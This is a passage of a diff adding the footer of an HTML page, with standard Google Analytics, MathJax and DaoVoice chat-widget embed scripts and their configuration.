+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-124439084-1', 'auto');
+    ga('send', 'pageview');
+
+</script>
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
+});
+</script>
+<script type="text/javascript" async
+  src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+
+	
+<script>(function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/APP_ID.js","daovoice");</script>
+<script>
+  daovoice('init', {
+    app_id: "45fb937d",
+  });
+  daovoice('update');
+</script>	
+</body>
+</html>
